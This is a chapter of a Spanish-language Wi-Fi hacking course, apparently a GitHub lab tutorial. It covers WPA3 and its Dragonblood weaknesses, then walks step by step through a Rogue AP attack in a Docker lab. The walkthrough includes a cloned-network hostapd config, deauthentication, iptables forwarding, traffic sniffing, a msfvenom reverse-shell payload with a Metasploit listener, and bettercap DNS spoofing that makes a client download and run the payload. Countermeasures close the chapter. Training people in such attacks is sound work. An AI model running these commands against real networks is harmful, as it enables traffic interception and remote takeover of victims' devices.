# Extra: WPA3 y Rogue AP
## Introducción
Antes de finalizar, se debe comentar el funcionamiento y posibles vulnerabilidades del último protocolo de seguridad Wi-Fi que ha surgido. Además, se comentará un ataque extra que imita un punto de acceso con el objetivo de que el cliente se conecte a este en lugar de al punto legítimo con el objetivo de facilitar así un ataque de tipo MITM. En primer lugar, se detallará la parte teórica relacionada con WPA3 y finalmente se procederá a realizar el ataque conocido como Rogue AP.

## Protocolo de Seguridad WPA3
WPA3 surge en el año 2018 como sucesor de WPA2, debido a las vulnerabilidades comentadas anteriormente sobre los protocolos WPA/WPA2. A fecha de este curso es el protocolo de seguridad en redes inalámbricas más actual y seguro conocido. En mayor detalle, los cambios respecto a WPA2 son: [[42](https://ieeexplore.ieee.org/document/10274082)]
- **Reemplazo de la PSK por SAE:**
  SAE es un nuevo mecanismo de autenticación que busca sustituir el proporcionado por WPA/WPA2 mediante la clave precompartida, debido a su vulnerabilidad frente ataques de diccionario. Este algoritmo de basa en el estándar de intercambio de clave seguro Dragonfly Key Exchange, dificultando a los atacantes probar masivas cantidades de contraseñas.

- **OWE:**
  Por primera vez en redes abiertas (sin necesidad de introducir claves) se establece un canal privado con cada usuario para cifrar la información que estos trasmiten, impidiendo que usuarios malintencionados puedan ver los datos intercambiados por otros usuarios en la misma red.

- **Forward Secrecy:**
  WPA3 impide que aquellos que han capturado una clave maestra puedan usarla para descifrar la información de una sesión distinta a la que pertenece dicha clave.

- **Enterprise Enhancements:**
  La seguridad en la versión Enterprise, mayormente destinada a entornos que requieren alta seguridad también se ve mejorada con WPA3. Este nuevo cifrado permite un uso consistente de claves de 192 bits en toda la red, así como el uso de algoritmos de cifrado y protección de la integridad robustos, como son AES-GCM-256, SHA-384.

### Vulnerabilidades 
A pesar de todas estas mejoras, WPA3 resulta tener algunas vulnerabilidades que fueron explotadas en el año 2019 por el conjunto de ataques Dragonblood:
- **Downgrade Attack:** [[42](https://ieeexplore.ieee.org/document/10274082)]
  Este tipo de ataques se basa en engañar al dispositivo que implementa WPA3 para que use un protocolo de inferior seguridad como puede ser WPA2.
- **Side-Channel Timing Attacks:**
  Permite a un atacante conocer parte de la clave SAE debido a una mala implementación de este algoritmo. Se basa en las operaciones que resuelve SAE para determinar si un punto ECC es válido o no, de forma que estas implementaciones tardan un tiempo diferente cuando es válido a cuando no lo es, lo cual es aprovechado por este tipo de ataques.
- **Cache-based Side-Channel Attacks:**
  Se aprovecha de aquellos entornos donde el atacante comparte CPU (como máquinas virtuales), de tal forma que observando la caché de la CPU se puede llegar a extraer patrones criptográficos de la implementación SAE.

### Contramedidas y recomendaciones
Este tipo de ataques requieren unas condiciones específicas, normalmente difíciles de encontrar o provocar. Por ello, WPA3 sigue siendo considerado un protocolo de seguridad muy robusto. Su uso está recomendado siempre que sea posible, pero sin dejar de darle importancia a una buena configuración debido a lo seguro que resulta. Siempre es importante tener los dispositivos que lo implementan bien configurados y actualizados para evitar que condiciones ajenas a WPA3 pongan en riesgo su seguridad. 

## Rogue AP
<img width="706" height="599" alt="image" src="https://github.com/user-attachments/assets/446ac8f2-41a0-4214-9c17-c6f36c0dbd2a" />
Este ataque se basa en la configuración de la tarjeta de red del atacante a modo de punto de acceso Wi-Fi que tenga exactamente las mismas características que el punto de acceso que trata de imitar (MAC y SSID principalmente). De esta forma se buscar imitar un punto de acceso concreto al que usualmente se conecta la víctima en cuestión (o al que ya está conectada). Por tanto, al crear este punto de acceso falso que imita al legítimo, el atacante puede aprovechar ciertas configuraciones que le permitan ser indistinguible al original, de tal manera que una señal más fuerte de este haga que el dispositivo víctima se conecte al dispositivo del atacante preferentemente del dispositivo víctima. Otra opción es aprovechar la conexión automática a una red conocida cuando la víctima se encuentra fuera del área del dispositivo legítimo, pero dentro del área de este punto de acceso falso.


Además, el punto de acceso falso debe dar servicio a Internet o a la red habitual a la cual se conecta el dispositivo para evitar que el usuario se dé cuenta, lo cual se traduce en la capacidad de robar o cambiar cualquier información que pase a través del dispositivo del atacante (MITM). Por tanto, el atacante tiene la capacidad de realizar entre otros, los ataques relacionados con [`MITM`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks#mitm-con-mensajes-en-claro) vistos en una sección previa. 

Por otro lado, resulta necesario conocer la clave del punto de acceso que se desea imitar, ya que para poder hacer un punto de acceso totalmente idéntico y que el usuario no sospeche, es necesario que este tenga la misma contraseña. Además, esto resulta necesario para poder aprovechar las conexiones automáticas que normalmente tenemos activas en nuestros dispositivos.

### Proceso de Ataque
Para este ataque se toman como base aquellos ficheros que construyen el laboratorio para [`WPA/WPA2 PSK`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-PSK), los cuales se encuentran también en esta rama. Sim embargo, se recomienda encarecidamente elegir la rama que se desee para lanzar el ataque, incluso probar varias de ellas (recalcando que la rama de [`WPA/WPA2 Enterprise`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-RADIUS) ya hace un ataque de este estilo con un objetivo diferente). 

Como todos los ataques anteriores se debe empezar arrancando el laboratorio y la máquina del atacante con objeto de lanzar las herramientas de `aircrack-ng` que nos permiten analizar la red víctima:
```
# Arrancar el laboratorio
sudo ./launch.sh
docker-compose exec attacker-1 bash
# Dentro de la shell de la máquina atacante:
airmon-ng start wlan4
airodump-ng wlan4mon
# Eliminar modo monitor tras finalizar el escaneo
airmon-ng stop wlan4mon
```
<img width="905" height="535" alt="image" src="https://github.com/user-attachments/assets/280f33db-ee46-4399-834b-becf0b8266ea" />

`Nota: ` En este laboratorio se usan 2 interfaces inalámbricas para el atacante con objeto de usar el modo monitor (típicamente se usará `wlan4`) y el modo punto de acceso (típicamente se usará `wlan5`) de manera simultánea.

De esta forma se aprecia como nos enfrentamos a una red de tipo `WPA2` con `CCMP`, algo fácil de imitar con la herramienta `hostapd` vista anteriormente. De esta forma, se puede crear el siguiente fichero `hostapd.conf` (ya cargado en la máquina Kali) que intenta imitar de la forma más fiel posible el punto de acceso víctima (pero en abierto, simulando que no conocemos la clave):
```
# Ver o modificar el archivo
nano hostapd.conf
```
```
# Contenido de hostapd.conf suponiendo que conocemos la clave
interface=wlan5
ssid=WPAnetwork
channel=6
hw_mode=g
wpa=2
wpa_passphrase=passw0rd123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```
`Nota: ` Se presupone que la clave del punto de acceso legítimo ha sido obtenida con anterioridad.

Antes de lanzar este punto de acceso es necesario darle una IP a la interfaz inalámbrica del atacante:
```
# IP del punto de acceso (de su interfaz inalámbrica)
ip addr add 10.5.2.193/26 dev wlan5
```

Así como configurar un servicio DHCP que emita IPs a los usuarios conectados (se usa una subred diferente para poder comprobar a que punto de acceso nos conectamos):
```
# Configuracion DHCP guardada en /etc/dhcp/dhcpd.conf
ddns-update-style interim;
ignore client-updates;
authoritative;

subnet 10.5.2.192 netmask 255.255.255.192 {
    range  10.5.2.194 10.5.2.254;   				                    # Rango de IPs (10.5.2.192/26) que se repartiran entre los usuarios conectados
    option subnet-mask 255.255.255.192;    			                # Mascara de subred que usaran los usuarios conectados
    option broadcast-address 10.5.2.255;  			                # Dirección de broadcast usada por los usuarios coenctados
    option routers 10.5.2.193;         				                  # Gateway usado por defecto por los usuarios conectados (IP del punto de acceso)
    option domain-name-servers 10.5.2.193, 8.8.8.8, 8.8.4.4;  	# IPs de los DNS por defecto usadas por los usuarios conectados

    default-lease-time 21600;    				                        # Tiempo en segundos hasta que expire la IP actual de cada usuario conectado
    max-lease-time 43200;
}
```
```
# Matar proceso DHCP anterior
pkill dhcpd
# Configurar ficheros necesarios para DHCP 
touch /var/lib/dhcp/dhcpd.leases
chown root:root /var/lib/dhcp/dhcpd.leases
# Lanzar servicio DHCP
dhcpd -cf /etc/dhcp/dhcpd.conf wlan5
```
* -cf /etc/dhcp/dhcpd.conf: ubicación del fichero de configuración DHCP (en este caso se podría omitir al encontrarse en la ubicación por defecto).
* wlan4: interfaz donde se levantará el servicio DHCP (interfaz que actuará como punto de acceso).

Ahora que ya está todo listo para imitar el punto de acceso legítimo, se puede lanzar la herramienta `hostapd` para crear un punto de acceso falso que sea idéntico:
```
pkill hostapd    # Matar proceso hostapd anterior
hostapd hostapd.conf 
```
* hostapd.conf: fichero de configuración que define los detalles del punto de acceso.
* -B: ejecutar en segundo plano (opcional pero no recomendable en este caso para poder ver cuando se conectan las víctimas).

Ahora se acosnseja comprobar la buena configiración de la nueva red con `airodump-ng`, donde se deberían ver 2 redes de igual SSID:
```
# En otra terminal
# Activar modo monitor si se deshabilitó
airmon-ng start wlan4
airodump-ng wlan4mon
```
<img width="987" height="202" alt="image" src="https://github.com/user-attachments/assets/6e3f285b-32f0-4915-9b97-c3b8c6707cf3" />

También es aconsejable probar la conexión mediante la interfaz secundaria habilitada para el atacante (`wlan4`):
```
# Cese del modo monitor
airmon-ng stop wlan4mon
# Conectarse al punto de acceso
pkill wpa_supplicant
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
# Pedir al servicio DHCP una IP una vez conectado al AP
dhclient wlan4
```
```
# Contenido de wpa_supplicant.conf para conexión con clave
# Ademas se añade la MAC del atacante para asegurar que se conecta a esta
network={
    ssid="WPAnetwork"
    psk="passw0rd123"
    bssid=02:00:00:00:05:00
}
```
<img width="718" height="820" alt="image" src="https://github.com/user-attachments/assets/ee6b57a5-3d34-4a87-90a7-b8136436ee7d" />

`Nota: ` Se confirma que se encuentra en el punto de acceso atacante porque ambas interfaces están en el mismo rango de red (`10.5.2.192/26`), el cual coincide con el de punto de acceso falso y no con el legítimo (`10.5.2.129/26`).

Una vez visto que todo funciona correctamente, podemos proceder a usar la herramienta `aireplay-ng` vista en ataques anteriores con objeto de deautenticar los clientes del punto de acceso legítimo, haciendo posible que se conecten a nuestro punto de acceso falso:
```
# En otra terminal (forzar canal para aireplay)
docker-compose exec attacker-1 bash
airmon-ng start wlan4
airodump-ng -c 6 wlan4mon
# En otra terminal 
docker-compose exec attacker-1 bash
aireplay-ng -0 10 -a 02:00:00:00:00:00 wlan4mon
```
- `-0:` deauthentication (ataque que fuerza deautenticaciones).
- `10:` número de mensajes de deautenticación enviados (valor alto para asegurar una desconexión durante un tiempo suficiente para que se conecten al AP falso).
- `-a 02:00:00:00:00:00:` dirección MAC del punto de acceso.
- `-c 02:00:00:00:02:00:` dirección MAC del cliente al que deautenticar (opcional, ya que en este caso en mejor que se lance a todos).
- `wlan4:` nombre de la interfaz usada.
<img width="859" height="643" alt="image" src="https://github.com/user-attachments/assets/cea6d0d8-0b41-425d-8c05-3a9172f85ecf" />
<img width="852" height="429" alt="image" src="https://github.com/user-attachments/assets/1853b702-796e-41e6-a71f-55871d952e96" />
<img width="914" height="287" alt="image" src="https://github.com/user-attachments/assets/29aa5bfa-b280-4481-84bb-5a0f8f7de0f4" />

`Nota: ` Al igual que en ataques anteriores, los mensajes EAPOL capturados indican que se ha hecho una autenticación, posiblemente en el punto de acceso creado por el atacante (las `MAC` indican que este proceso es contra el AP atacante).

Tras ver que alguno de los clientes está conectado, nuestro objetivo se habrá cumplido, teniendo así acceso a la información que atraviesa el punto de acceso. De esta forma, se podría lanzar cualquiera de los ataques MITM vistos en el capítulo [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks) (acción que se recomienda probar). Sin embargo, se lanzará un ataque distinto del mismo tipo (MITM) con objeto de comprobar la utilidad de crear un punto de acceso falso que imite al legítimo.

Antes de continuar, sería recomendable dar acceso a Internet o aquella red a la cual el punto de acceso legítimo esté conectado para hacer un ataque más realista. Por este motivo, se realiza una conexión al punto de acceso legítimo (se asume un previo ataque como el mostrado en el capítulo [`WPA/WPA2 PSK Cracking Lab`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-PSK) que permita conocer la clave de acceso) desde el punto de acceso falso. Además, se imponen en este último las siguientes reglas `iptables` (reglas de firewall) que permiten que el tráfico viaje del punto de acceso falso al legítimo y al resto de la red:
```
# Permitir el paso a través de paquetes
echo 1 > /proc/sys/net/ipv4/ip_forward

# Tirar todo el tráfico que pase a través de la máquina
iptables -P FORWARD DROP

# Permitir únicamente el tráfico a través de la WLAN creada
iptables -A FORWARD -s 10.5.2.192/26 -d 10.5.2.192/26 -i wlan5 -o wlan5 -j ACCEPT

# Permitir únicamente el tráfico a través de la red inalámbrica (y enmascarar este) a la cableada  
iptables -A FORWARD -s 10.5.2.192/26 -i wlan5 -o wlan4 -j ACCEPT
iptables -A FORWARD -d 10.5.2.192/26 -i wlan4 -o wlan5 -j ACCEPT
iptables -t nat -A POSTROUTING -s 10.5.2.192/26 -o wlan4 -j MASQUERADE

# Permitir tráfico loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
```

Además, es necesario conectar la interfaz secundaria (`wlan4`) al punto de acceso legítimo para que todo funcione correctamente. Sin embargo, antes se debe comprobar que `wpa_supplicant.conf` está adaptado para conectarse a la dirección `MAC` del punto de acceso (`02:00:00:00:00:00`):
```
# Contenido de wpa_supplicant.conf para conexión con AP legítimo
network={
    ssid="WPAnetwork"
    psk="passw0rd123"
    bssid=02:00:00:00:00:00
}
```
```
# Cese del modo monitor
airmon-ng stop wlan4mon
# Conectarse al punto de acceso
pkill wpa_supplicant
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
# Pedir al servicio DHCP una IP una vez conectado al AP
dhclient wlan4
```
<img width="720" height="796" alt="image" src="https://github.com/user-attachments/assets/9f8ad04f-9c93-4a13-81a8-e0afd0e6fcbd" />

Ahora, desde cualquiera de los clientes afectados se puede comprobar que estamos en el punto de acceso falso con `ifconfig`, mostrando un rango de IP `10.5.2.192/26` en lugar del legítimo rango `10.5.2.128/26`. Además, se puede usar `ping`para comprobar que siguen siendo visibles las máquinas de la red interna gracias a las reglas `iptables` recién instauradas en el punto de acceso falso:
```
# En otra terminal (puede realizarse con otro cliente o máquina destino)
docker-compose exec client-2 bash
ifconfig
ping 10.5.2.21
curl 10.5.1.20
```
<img width="761" height="837" alt="image" src="https://github.com/user-attachments/assets/fbedb332-4bbd-4da3-9a5b-7cf6bc153df4" />

También se puede probar a ver el tráfico que pasa por el punto de acceso con herramientas como `ettercap` o `tcpdump`:
```
ettercap -T -i wlan5
tcpdump -i wlan5 -n -vv
```
```
# En otra terminal
docker-compose exec client-1 bash
curl 10.5.1.21
```
<img width="785" height="709" alt="image" src="https://github.com/user-attachments/assets/c827409e-3919-4f6c-be1e-a4b44d23fd76" />
<img width="721" height="551" alt="image" src="https://github.com/user-attachments/assets/8d581094-2190-4064-8a68-f2cead3d312b" />
<img width="1856" height="837" alt="image" src="https://github.com/user-attachments/assets/a54ca3f6-2352-4937-8d31-ee74e95c0d14" />

`Nota: ` Ejecutar `echo 1 > /proc/sys/net/ipv4/ip_forward` en la máquina atcante tras activar `ettercap`, ya que `ettercap` a veces desactiva el bit de `FORWARDING`

Aquí por ejemplo se ve como intercepta correctamente tráfico HTTP que establece uno de los clientes contra los servidores de la organización.

`Nota: ` Esto es similar a un ataque con `ettercap` para ver el tráfico en plano, tal y como se vio en [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks#mitm-con-mensajes-en-claro).

De esta forma, se comprueba que el ataque ha sido un éxito, siendo muy difícil de detectar para los usuarios afectados. Por tanto, ha llegado el momento de lanzar un ataque MITM que sea capaz de introducir malware en los dispositivos afectados con objeto de obtener el control sobre estos. En primer lugar, se empezará creando una shell reversa (la víctima se conecta al atacante para que este pueda ejecutar comandos sobre la víctima) a forma de malware con la ayuda de la herramienta `msfpayload` (parte del framework metasploit visto anteriormente):
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.5.2.193 LPORT=443 -f elf -o /attacker/exploit.elf
```
* `-p linux/x86/meterpreter/reverse_tcp:` shell reversa para Linux.
* `LHOST=10.5.2.193:` dirección IP donde el atacante escuchará la shell inversa.
* `LPORT=443:` puerto TCP donde el atacante escuchará la shell inversa.
* `-f elf:` ejecutable de Linux.
* `-o /attacker/exploit.exe:` fichero donde se creará el malware.

Una vez creado el malware, se debe abrir una consola de `metasploit` (esto ya ha sido usado en [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks#ataque-con-metasploit)) con la intención de preparar la máquina del atacante para que escuche las peticiones de la shell reversa y pueda ejecutar comandos en la víctima una vez esta se conecta:
```
msfconsole
# Una vez dentro de la consola
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 10.5.2.193
set LPORT 443
# Si se desea ver en más detalle las opciones del exploit
show options
# Lanzar el ataque 
run
```
<img width="841" height="841" alt="image" src="https://github.com/user-attachments/assets/33445ee0-03a1-481a-928e-5b58657ece12" />
<img width="876" height="491" alt="image" src="https://github.com/user-attachments/assets/63b413a1-5877-4c0d-bba3-26adaecdd9ac" />

De esta forma, ya tenemos una terminal que espera a que un cliente legítimo caiga en la trampa y se conecte con la shell inversa. En cambio, aún queda parte de la configuración necesaria para que el tráfico del cliente sea desviado haciendo que se descargue y ejecute el fichero con malware creado (`exploit.elf`). En primer lugar, se debe crear un sitio web encargado de descargar este exploit en las víctimas. Para ello se usa Python para servir rápidamente los ficheros de la ruta `/var/www/html` cuando se acceda al puerto `80` (`HTTP`) del atacante en la interfaz `wlan5` (la cual es visible como `10.5.2.193` en la red `10.5.2.192/26` ofrecida por el punto de acceso falso):
```
cd /var/www/html
# Hacer que se descargue desde la raiz 
cp /attacker/exploit.elf ./index.html
python3 -m http.server 80
```
<img width="590" height="267" alt="image" src="https://github.com/user-attachments/assets/0bccc296-95d9-42bf-9bbb-a5ad4356905c" />

Una vez lanzado el servicio solo falta redirigir el tráfico del `carlos.web.com` (también se hizo en el capítulo [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks#dns-spoofing-para-robo-de-credenciales) hacia la web recién creada en `10.5.2.192:80`. Sin embargo, esta vez no usaremos `ettercap`, ya que no funciona muy bien cuando las víctimas se encuentran en 2 interface diferentes (`wlan4` y `wlan5`). En su lugar se usará una herramienta similar conocida como `bettercap` para realizar un `DNS Spoofing` que interfiera el dominio `carlos.web.com` para cambiarlo por la web maliciosa.
```
# En otra terminal (forzar canal para aireplay)
docker-compose exec attacker-1 bash
# Iniciar la herramienta de spoofing
bettercap -iface wlan5
```
* `-iface:` interfaz desde la cual se ejecuta (debe ser la que aloja el punto de acceso para poder ver a las víctimas)
```
# Una vez dentro (aconsejable copiar uno a uno)
net.probe on                            # Escaneo activo de red (se aprecian los dispositivos conectados en este caso)
net.recon on                            # Reconocimiento activo y pasivo de la red (es posible que ya se haya hecho en el paso anterior)
arp.spoof on                            # Envenenar caches/tablas ARP (obligan que 10.5.2.193 se gw, aunque ya lo es)
set dns.spoof.domains carlos.web.com    # Definir dominio que será interceptado
set dns.spoof.address 10.5.2.193        # Definir IP a la que se redirige cuando se intenta acceder al dominio seleccionado
dns.spoof on                            # Empezar ataque DNS Spoofing
```
<img width="1080" height="446" alt="image" src="https://github.com/user-attachments/assets/972309f4-f82f-47e2-b7a3-77d25fe44928" />

Finalmente, se ve como se descarga el malware al acceder al dominio mencionado:
```
wget http://carlos.web.com/
# Es necesario ejecutarlo en este caso de forma manual
chmod +x index.html
./index.html
```
**Cliente:**
<img width="1788" height="391" alt="image" src="https://github.com/user-attachments/assets/ed95ceac-a03f-4077-a63f-34b4ed9c3042" />
<img width="768" height="99" alt="image" src="https://github.com/user-attachments/assets/d774d290-7c45-4426-9508-f35a6d8bedae" />

**Atacante:**
<img width="625" height="164" alt="image" src="https://github.com/user-attachments/assets/84d5a264-e9ee-4a6f-b704-ab7a2093edf0" />
<img width="994" height="388" alt="image" src="https://github.com/user-attachments/assets/d32ccb39-0590-482d-a084-868ba5585b25" />
<img width="967" height="118" alt="image" src="https://github.com/user-attachments/assets/d03fce93-0070-4546-a474-d667d177c39b" />

`Nota: ` Este ataque es posible al estar comentado en la cache local (`/etc/hosts`) la referencia del dominio `carlos.web.com` a la IP `10.5.0.20`.

En este caso se ejecuta de forma manual, ya que se trata de una simulación de un caso real simplificada para observar los peligros que proporcionan los puntos de acceso falsos. Observando cómo conseguimos una consola en la víctima.

Normalmente se usaría la herramienta `Set` vista en el capítulo [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks) para crear un clon de una web visitada habitualmente por las víctimas (se puede observar el tráfico de estos como se vio al probar con `ettercap` y `tcpdump`) que luego se complementa con el malware creado. Este tipo de acciones normalmente te devuelve la página legítima junto a un pop-up que al aceptarlo descarga y ejecuta dicho malware (es necesaria la acción de aceptar, pero suele ser creíble):
<img width="670" height="557" alt="image" src="https://github.com/user-attachments/assets/43729f1f-44bb-4180-b35e-4a25462766e3" />
Sin embargo, en este laboratorio se opta por una adaptación mucho más sencilla debida a las limitaciones del laboratorio.

Con esto se aprecia la importancia de conectarnos al punto de acceso correcto e ignorar otros que puedan resultar atractivos por su nombre cómo `MOVISTAR_XXX_PLUS_PLUS` o `MOVISTAR_XXX_6G`, los cuales pueden ser propiedad de un usuario malintencionado que se intenta aprovechar del desconocimiento para hacer un ataque MITM. En este caso no se ha estudiado una conexión por error humano como la mencionada, lo cual es más difícil de controlar por parte de los usuarios, sin embargo, esto también recalca la importancia de hacer las configuraciones de seguridad correctas, sobre todo por los administradores de red en las organizaciones que manejan datos delicados. 

`Nota: ` Se recomienda investigar cómo se pueden realizar los ataques de tipo MITM con las condiciones especiales del `Rogue AP` para ampliar el conocimiento adquirido. 

`Pista: ` En este caso no hace falta especificar las IPs de las víctimas, es más conveniente usar el mod (`ettercap -T -i wlan5`), ya que el jugar con 2 interfaces en el atacante puede complicar el uso de `ettercap`. También se recomienda investigar más a fondo otras herramientas como la recientemente vista (`bettercap`).


### Contramedidas y Recomendaciones
En cuanto a las protecciones ante este ataque, no basta simplemente con estar atentos a los nombres de las redes a las cuales nos conectamos (a no ser que sean realmente sospechosas de ser falsa), sino que hay que adoptar otras medidas más fuertes. Una buena idea sería evitar la opción de conectarse automáticamente a cualquier red, lo cual no es lo más cómodo en cuanto a usabilidad se refiere, pero podría llegar a ayudar para evitar la imitación de redes típicas (por ejemplo, nombres de puntos de acceso por defecto de las compañías telefónicas). Por otro lado, también se podría intentar limitar el área de alcance del dispositivo que imparte la red al área de la oficina u hogar donde se usa, de forma que solo tengan acceso los que tienen acceso físico a ese lugar. Esto no es nada fácil, pero nuevas tecnologías como WiFi 6 van encaminadas hacia ello.

En cambio, la opción más realista de todas es el uso de una [`VPN`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/config#vpn) que cree una red cifrada y segura en una red que no tenga por qué serlo. Esto hace que cualquier información que los usuarios envíen se trasmita por un canal seguro, aunque atraviese una red o dispositivo que no lo sea. Por tanto, su uso sería especialmente aconsejado cuando queramos hacer una comunicación con datos sensibles, no siendo tan necesario en ocasiones en las cuales se visite el periódico local, por ejemplo. También serían interesantes las opciones vistas en el [capítulo anterior](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-RADIUS#contramedidas-y-recomendaciones) consistentes en el refuerzo de las configuraciones que limitan los puntos de acceso a los que nos conectamos (sobre todo en entornos más grandes administrados por una persona especializada).

Por último, se debe recalcar la importancia de ajustar las medidas y el nivel de seguridad a las necesidades de cada caso, ya que, en ciertas ocasiones, como en entornos del hogar no tendría sentido un excesivo nivel de seguridad con las versiones Enterprise, por ejemplo. Sin embargo, en estos casos no se debe dejar de lado la seguridad por completo, sino que es de vital importancia activar aquellas configuraciones que no comprometan la usabilidad. Sin embargo, en el caso de empresas u organizaciones, si cupiese dedicar más tiempo y recursos a cuidar en mayor profundidad la seguridad de sus redes y dispositivos, haciendo incluso auditorias cada cierto tiempo. Como ya se ha visto, un atacante puede hacer mucho daño a una empresa, a sus trabajadores o a los clientes que le dan la confianza de manejar sus datos. Por tanto, es muy importante que el nivel de seguridad se ajuste a las necesidades, en especial al tratar con datos sensibles de terceros.

`Nota: ` El laboratorio construido tiene mucho más potencial que limitarse a los ataques mostrados, de tal forma que se recomienda encarecidamente su uso para seguir aprendiendo y mejorando las habilidades como auditor. Incluso, sería posible ampliarlo o adaptarlo para la puesta en prueba de algún ataque que necesite de alguna configuración especial o que no se considere. Para ello se recomienda la lectura del capítulo [config](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/config), donde se pretende dar una visión más detallada de la construcción del laboratorio.


[`Lección anterior, cracking de redes WPA/WPA2 EAP`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-RADIUS)
